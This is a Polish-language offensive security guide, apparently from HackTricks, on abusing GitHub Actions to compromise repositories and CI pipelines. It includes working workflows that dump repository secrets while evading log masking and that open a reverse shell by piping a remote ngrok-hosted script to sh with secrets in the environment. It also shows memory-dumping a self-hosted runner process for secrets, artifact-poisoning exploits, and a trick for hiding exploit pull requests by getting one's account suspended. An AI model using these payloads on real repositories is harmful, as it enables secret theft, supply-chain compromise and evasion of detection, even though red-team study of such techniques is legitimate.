# Nadużywanie Github Actions

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Na tej stronie znajdziesz:

* **Podsumowanie wszystkich skutków** uzyskania dostępu do Github Action przez atakującego
* Różne sposoby **uzyskania dostępu do akcji**:
* Posiadanie **uprawnień** do tworzenia akcji
* Nadużywanie wyzwalaczy związanych z **pull requestami**
* Nadużywanie **innych technik zewnętrznego dostępu**
* **Pivotowanie** z już skompromitowanego repozytorium
* Na koniec, sekcja dotycząca **technik poeksploatacyjnych do nadużywania akcji od wewnątrz** (spowodowanie wspomnianych skutków)

## Podsumowanie skutków

Wprowadzenie do [**Github Actions znajdziesz w podstawowych informacjach**](../basic-github-information.md#github-actions).

W przypadku, gdy możesz **wykonywać dowolne akcje Github/iniekcję kodu** w **repozytorium**, możesz mieć możliwość:

* **Kraść** **sekrety** z tego repozytorium/organizacji.
* Jeśli możesz tylko wstrzykiwać, możesz kraść to, co już jest obecne w przepływie pracy.
* Nadużywać **uprawnień repozytorium** do dostępu do innych platform, takich jak AWS i GCP.
* **Wykonywać kod w niestandardowych pracownikach** (jeśli są używane niestandardowe pracowniki) i próbować pivotować stamtąd.
* **Nadpisywać** kod **repozytorium**.
* To zależy od uprawnień `GITHUB_TOKEN` (jeśli takie istnieją).
* **Kompromitować** **wdrożenia** i inne **artefakty**.
* Jeśli kod jest wdrażany lub przechowywany, możesz go zmodyfikować i uzyskać dalszy dostęp.

## GITHUB\_TOKEN

Ten "**sekret**" (pochodzący z `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) jest udzielany, gdy administrator włącza tę opcję:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ten token jest taki sam, jakiego używa **Aplikacja Github**, więc może uzyskać dostęp do tych samych punktów końcowych: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github powinien udostępnić [**przepływ**](https://github.com/github/roadmap/issues/74), który **umożliwia dostęp międzyrepozytorialny** w GitHub, dzięki czemu repozytorium może uzyskać dostęp do innych wewnętrznych repozytoriów za pomocą `GITHUB_TOKEN`.
{% endhint %}

Możesz zobaczyć możliwe **uprawnienia** tego tokenu pod adresem: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Należy zauważyć, że token **wygasa po zakończeniu zadania**.\
Te tokeny wyglądają tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Niektóre interesujące rzeczy, które możesz zrobić za pomocą tego tokenu:

{% tabs %}
{% tab title="Scal PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Zatwierdź PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Utwórz PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Zauważ, że w wielu przypadkach będziesz w stanie znaleźć **tokeny użytkownika Github w zmiennych środowiskowych Github Actions lub w sekretach**. Te tokeny mogą dać Ci większe uprawnienia w repozytorium i organizacji.
{% endhint %}

<details>

<summary>Wyświetl listę sekretów w wynikach Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj odwróconą powłokę z sekretami</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Możliwe jest sprawdzenie uprawnień udzielonych tokenowi Github w repozytoriach innych użytkowników **sprawdzając logi** akcji:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone wykonanie

{% hint style="info" %}
To byłoby najłatwiejsze sposobem na kompromitację akcji Github, ponieważ w tym przypadku zakłada się, że masz dostęp do **tworzenia nowego repozytorium w organizacji** lub masz **uprawnienia do zapisu w repozytorium**.

Jeśli jesteś w tej sytuacji, możesz po prostu sprawdzić [techniki eksploatacji po](./#techniki-eksploatacji-po-wewnątrz-akcji).
{% endhint %}

### Wykonanie z tworzenia repozytorium

W przypadku, gdy członkowie organizacji mogą **tworzyć nowe repozytoria** i możesz wykonywać akcje github, możesz **utworzyć nowe repozytorium i ukraść tajemnice ustawione na poziomie organizacji**.

### Wykonanie z nowej gałęzi

Jeśli możesz **utworzyć nową gałąź w repozytorium, które już zawiera skonfigurowaną akcję Github**, możesz ją **zmodyfikować**, **przesłać** zawartość, a następnie **wykonać tę akcję z nowej gałęzi**. W ten sposób możesz **wyciekać tajemnice na poziomie repozytorium i organizacji** (ale musisz wiedzieć, jak się nazywają).

Możesz sprawić, że zmodyfikowana akcja będzie wykonywalna **ręcznie**, gdy **utworzony zostanie PR** lub gdy **kod zostanie przesłany** (w zależności od tego, jak hałaśliwy chcesz być):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Wykonanie przez rozgałęzienie

{% hint style="info" %}
Istnieją różne wyzwalacze, które mogą umożliwić atakującemu **wykonanie Github Action z innego repozytorium**. Jeśli te akcje wyzwalające są źle skonfigurowane, atakujący może je skompromitować.
{% endhint %}

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchamia workflow za każdym razem, gdy otrzymuje żądanie pull requestu, z pewnymi wyjątkami: domyślnie, jeśli jest to **pierwszy raz**, gdy **współpracujesz**, jakiś **opiekun** musi **zaakceptować** **uruchomienie** workflow:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ponieważ **domyślne ograniczenie** dotyczy **nowych współpracowników**, możesz przyczynić się do **naprawy ważnego błędu/ortografii** i następnie wysłać **inne PR-y, aby wykorzystać nowe uprawnienia `pull_request`**.

**Przetestowałem to i nie działa**: ~~Inną opcją byłoby utworzenie konta o nazwie osoby, która przyczyniła się do projektu i usunięła swoje konto.~~
{% endhint %}

Ponadto, domyślnie **uniemożliwia dostęp do zapisu** i **dostęp do sekretów** w repozytorium docelowym, jak wspomniano w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjątkiem `GITHUB_TOKEN`, **sekrety nie są przekazywane do wykonawcy** podczas uruchamiania workflow z **rozgałęzionego** repozytorium. **`GITHUB_TOKEN` ma uprawnienia tylko do odczytu** w żądaniach pull requestów **z rozgałęzionych repozytoriów**.

Atakujący może zmodyfikować definicję Github Action w celu wykonania dowolnych czynności i dołączenia dowolnych akcji. Jednak nie będzie mógł kraść sekretów ani nadpisywać repozytorium ze względu na wspomniane ograniczenia.

{% hint style="danger" %}
**Tak, jeśli atakujący zmieni w PR akcję Github, która zostanie wywołana, jego Github Action zostanie użyta, a nie ta z repozytorium źródłowego!**
{% endhint %}

Ponieważ atakujący kontroluje również kod, który jest wykonywany, nawet jeśli nie ma sekretów ani uprawnień do zapisu w `GITHUB_TOKEN`, atakujący może na przykład **przesyłać złośliwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w repozytorium docelowym i **dostęp do sekretów** (i nie wymaga zgody).

Należy zauważyć, że wyzwalacz workflow **`pull_request_target`** **uruchamia się w kontekście bazowym** i nie w kontekście PR (aby **nie wykonywać niezaufanego kodu**). Aby uzyskać więcej informacji na temat `pull_request_target`, [**sprawdź dokumentację**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ponadto, aby uzyskać więcej informacji na temat tego konkretnego niebezpiecznego użycia, sprawdź ten [**wpis na blogu Githuba**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Może się wydawać, że ponieważ **wykonywane workflow** jest zdefiniowane w **bazowym** repozytorium, a nie w PR, używanie **`pull_request_target`** jest **bezpieczne**, ale istnieją **kilka przypadków, w których nie jest**.

A ten będzie **miał dostęp do sekretów**.

### `workflow_run`

Wyzwalacz [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) umożliwia uruchomienie workflow z innego workflow, gdy jest `completed`, `requested` lub `in_progress`.

W tym przykładzie workflow jest skonfigurowane do uruchomienia po zakończeniu oddzielnego workflow "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ponadto, zgodnie z dokumentacją: Workflow rozpoczęty przez zdarzenie `workflow_run` ma możliwość **dostępu do sekretów i zapisywania tokenów, nawet jeśli poprzedni workflow tego nie robił**.

Tego rodzaju workflow może być atakowany, jeśli **zależy** on od workflow, który może być **uruchomiony** przez zewnętrznego użytkownika za pomocą **`pull_request`** lub **`pull_request_target`**. Kilka przykładów podatnych na ataki można znaleźć w [**tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy z nich polega na pobraniu kodu atakującego przez workflow uruchomiony za pomocą **`workflow_run`**: `${{ github.event.pull_request.head.sha }}`\
Drugi polega na **przekazaniu** artefaktu z niezaufanego kodu do workflow **`workflow_run`** i wykorzystaniu zawartości tego artefaktu w sposób, który czyni go podatnym na RCE.

### `workflow_call`

TODO

TODO: Sprawdź, czy wykonując z `pull\_request`, używany/pobierany kod to kod z oryginału czy z rozgałęzionej PR

## Wykorzystywanie wykonania z rozgałęzienia

Wymieniliśmy wszystkie sposoby, w jakie zewnętrzny atakujący mógłby spowodować wykonanie workflow w Githubie, teraz przyjrzyjmy się, jak to wykonanie, jeśli jest źle skonfigurowane, może być wykorzystane:

### Wykonanie niezaufanego pobrania

W przypadku **`pull_request`**, workflow zostanie wykonane w **kontekście PR** (czyli zostanie wykonany **złośliwy kod PR**), ale ktoś musi go **autoryzować** i zostanie uruchomiony z pewnymi [ograniczeniami](./#pull\_request).

W przypadku workflow korzystającego z **`pull_request_target` lub `workflow_run`**, który zależy od workflow, które może być uruchomione z **`pull_request_target` lub `pull_request`**, zostanie wykonany kod z oryginalnego repozytorium, więc **atakujący nie może kontrolować wykonanego kodu**.

{% hint style="danger" %}
Jednak jeśli **akcja** ma **wyraźne pobranie PR**, które **pobierze kod z PR** (a nie z bazy), zostanie użyty kod kontrolowany przez atakującego. Na przykład (sprawdź linię 12, gdzie pobierany jest kod PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NIEBEZPIECZNE. Przykład tylko w celach demonstracyjnych.
on:
pull_request_target

jobs:
build:
name: Budowanie i testowanie
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Dziękuję!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`**, ponieważ skrypty budowania i używane **pakiety są kontrolowane przez autora PR**.

{% hint style="warning" %}
Dork Githuba do wyszukiwania podatnych akcji to: `event.pull_request pull_request_target extension:yml`, jednak istnieje wiele różnych sposobów konfiguracji zadań, które można wykonać w sposób bezpieczny, nawet jeśli akcja jest skonfigurowana w sposób niebezpieczny (np. używając warunków dotyczących tego, kto jest aktorem generującym PR).
{% endhint %}

### Wstrzykiwanie skryptów kontekstowych <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Należy zauważyć, że istnieją pewne [**konteksty Githuba**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), których wartości są **kontrolowane** przez **użytkownika** tworzącego PR. Jeśli akcja Githuba używa tych danych do wykonania czegokolwiek, może to prowadzić do **wykonania dowolnego kodu:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Wstrzykiwanie skryptów do GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: Możesz udostępnić **zmienne środowiskowe** dla kolejnych kroków w zadaniu workflow, definiując lub aktualizując zmienną środowiskową i zapisując ją w pliku środowiskowym **`GITHUB_ENV`**.

Jeśli atakujący mógłby **wstrzyknąć dowolną wartość** do tej zmiennej **env**, mógłby wstrzyknąć zmienne środowiskowe, które mogłyby wykonywać kod w kolejnych krokach, takich jak **LD\_PRELOAD** lub **NODE\_OPTIONS**.

Na przykład ([**ten**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ten**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobraź sobie workflow, które polega na zaufaniu do przesłanego artefaktu, aby przechować jego zawartość w zmiennej środowiskowej **`GITHUB_ENV`**. Atakujący mógłby przesłać coś takiego, aby go skompromitować:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Podatne akcje Githuba stron trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**tym wpisie na blogu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta akcja Githuba umożliwia dostęp do artefaktów z różnych workflow i nawet repozytoriów.

Problem polega na tym, że jeśli parametr **`path`** nie jest ustawiony, artefakt jest rozpakowywany w bieżącym katalogu i może nadpisać pliki, które mogą być później używane lub nawet wykonywane w workflow. Dlatego, jeśli Artefakt jest podatny, atakujący może wykorzystać to do skompromitowania innych workflow, które ufały Artefaktowi.

Przykład podatnego workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
To może zostać zaatakowane za pomocą tego workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Inne zewnętrzne dostępy

### Przechwytywanie usuniętego repozytorium przestrzeni nazw

Jeśli konto zmieni swoją nazwę, inny użytkownik może zarejestrować konto o tej samej nazwie po pewnym czasie. Jeśli repozytorium miało **mniej niż 100 gwiazdek przed zmianą nazwy**, Github pozwoli nowo zarejestrowanemu użytkownikowi o tej samej nazwie utworzyć **repozytorium o tej samej nazwie** jak usunięte.

{% hint style="danger" %}
Jeśli działanie korzysta z repozytorium nieistniejącego konta, nadal istnieje możliwość, że atakujący może utworzyć to konto i naruszyć działanie.
{% endhint %}

Jeśli inne repozytoria korzystają z **zależności z repozytoriów tego użytkownika**, atakujący będzie w stanie przejąć je. Tutaj znajduje się bardziej szczegółowe wyjaśnienie: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Prowadzenie repozytorium

{% hint style="info" %}
W tej sekcji omówimy techniki, które umożliwią **przejście z jednego repozytorium do innego**, zakładając, że mamy pewien rodzaj dostępu do pierwszego (sprawdź poprzednią sekcję).
{% endhint %}

### Zatrucie pamięci podręcznej

Pamięć podręczna jest utrzymywana między **uruchomieniami przepływu pracy w tej samej gałęzi**. Oznacza to, że jeśli atakujący **naruszy** **pakiet**, który jest następnie przechowywany w pamięci podręcznej i **pobrany** oraz wykonany przez **bardziej uprzywilejowany** przepływ pracy, będzie w stanie również **naruszyć** ten przepływ pracy.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Zatrucie artefaktów

Przepływy pracy mogą korzystać z **artefaktów z innych przepływów pracy i nawet repozytoriów**, jeśli atakujący zdoła **naruszyć** działanie Github, które **przesyła artefakt**, który jest później używany przez inny przepływ pracy, może **naruszyć inne przepływy pracy**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Po wykorzystaniu z działania

### Dostęp do AWS i GCP za pomocą OIDC

Sprawdź następujące strony:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Dostęp do sekretów <a href="#accessing-secrets" id="accessing-secrets"></a>

Jeśli wstrzykujesz zawartość do skryptu, warto wiedzieć, jak uzyskać dostęp do sekretów:

* Jeśli tajemnica lub token jest ustawiony jako **zmienna środowiskowa**, można go bezpośrednio uzyskać, korzystając z **`printenv`**.

<details>

<summary>Wyświetlanie sekretów w wynikach działania Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj odwróconą powłokę z sekretami</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Jeśli sekret jest używany **bezpośrednio w wyrażeniu**, wygenerowany skrypt powłoki jest przechowywany **na dysku** i jest dostępny.
* ```bash
cat /home/runner/work/_temp/*
```
* Dla akcji JavaScript sekrety są przesyłane za pomocą zmiennych środowiskowych
* ```bash
ps axe | grep node
```
*   Dla **niestandardowej akcji**, ryzyko może się różnić w zależności od tego, jak program wykorzystuje uzyskany z **argumentu** sekret:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Nadużywanie własnych runnerów

Sposobem na znalezienie **Akcji Github wykonywanych w infrastrukturze spoza Githuba** jest wyszukiwanie **`runs-on: self-hosted`** w konfiguracji yaml Akcji Github.

**Własne** runnery mogą mieć dostęp do **bardziej wrażliwych informacji**, do innych **systemów sieciowych** (podatne punkty końcowe w sieci? usługa metadanych?) lub, nawet jeśli jest izolowany i zniszczony, **może być uruchomionych więcej niż jedna akcja naraz** i złośliwa akcja może **ukraść sekrety** innej akcji.

W własnych runnerach możliwe jest również uzyskanie **sekretów z procesu **_**Runner.Listener**_**, który będzie zawierał wszystkie sekrety workflow w dowolnym kroku poprzez zrzucenie jego pamięci:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Sprawdź [**ten post dla więcej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obrazów Docker w Github

Możliwe jest tworzenie akcji Github, które będą **budować i przechowywać obraz Docker wewnątrz Github**.\
Przykład można znaleźć w poniższym rozwijanym bloku:

<details>

<summary>Akcja Github - Budowanie i Wysyłanie Obrazu Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Jak można zauważyć w poprzednim kodzie, rejestr Github jest hostowany na **`ghcr.io`**.

Użytkownik posiadający uprawnienia do odczytu repozytorium będzie w stanie pobrać obraz Dockerowy przy użyciu tokena dostępu osobistego:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Następnie użytkownik może szukać **wyciekłych sekretów w warstwach obrazu Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Wrażliwe informacje w dziennikach Github Actions

Nawet jeśli **Github** próbuje **wykrywać wartości sekretne** w dziennikach działań i **unika ich wyświetlania**, **inne wrażliwe dane**, które mogły zostać wygenerowane podczas wykonywania działania, nie zostaną ukryte. Na przykład JWT podpisany za pomocą wartości sekretnej nie zostanie ukryty, chyba że jest to [specjalnie skonfigurowane](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Zakrywanie śladów

(Technika z [**tutaj**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Przede wszystkim, każde podniesione PR jest widoczne publicznie w Github i na koncie docelowym w GitHub. W GitHub domyślnie **nie możemy usunąć PR z internetu**, ale jest pewien haczyk. Dla kont Github, które są **zawieszone** przez Github, wszystkie ich **PR są automatycznie usuwane** i usuwane z internetu. Aby ukryć swoją aktywność, musisz albo **zawiesić swoje konto GitHub, albo oznaczyć swoje konto**. Spowoduje to **ukrycie wszystkich twoich działań** na GitHub przed internetem (w zasadzie usunięcie wszystkich twoich exploit PR)

Organizacja w GitHub jest bardzo aktywna w zgłaszaniu kont do GitHub. Wystarczy udostępnić "jakieś rzeczy" w problemie, a oni upewnią się, że twoje konto zostanie zawieszone w ciągu 12 godzin :p i oto masz, twój exploit jest niewidoczny na github.

{% hint style="warning" %}
Jedynym sposobem dla organizacji, aby dowiedzieć się, że zostały zaatakowane, jest sprawdzenie dzienników GitHub z SIEM, ponieważ z interfejsu GitHub PR zostanie usunięte.
{% endhint %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
